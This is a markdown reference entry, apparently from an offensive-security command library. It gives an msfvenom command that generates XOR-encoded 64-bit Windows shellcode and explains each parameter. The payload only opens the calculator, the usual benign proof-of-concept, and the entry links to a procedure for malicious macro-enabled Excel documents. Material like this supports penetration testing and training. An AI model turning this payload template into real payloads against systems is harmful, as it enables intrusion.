---
id: 5573ec8b-ce71-4ad0-a14f-982d17dde61c-2
name: msfvenom-generate-x64-calc-shellcode
type: command
executor: bash
data: >-
  msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe
  -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
output: null
created_at: '2023-04-06T03:56:23.232564+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - msfvenom
verified: true
validated: true
---

# msfvenom-generate-x64-calc-shellcode

## Command

```bash
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```

## Description

Generates a 64-bit Windows shellcode payload that executes calc.exe using XOR encoding to avoid null bytes. Output redirected to popcalc64.bin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a x64 | Architecture: 64-bit | Yes |
| -b '\x00' | Avoid null bytes | Yes |
| --platform windows | Target platform | Yes |
| -p windows/x64/exec | 64-bit exec payload | Yes |
| cmd=calc.exe | Command to run | Yes |
| -e x64/xor | XOR encoder | Yes |
| -f raw | Raw binary format | Yes |
| EXITFUNC=thread | Threaded exit | Yes |
| > popcalc64.bin | Output file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```

## Expected Output

Silent execution; popcalc64.bin created (~200 bytes). Check with `file popcalc64.bin` (data file).

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/msfvenom]]
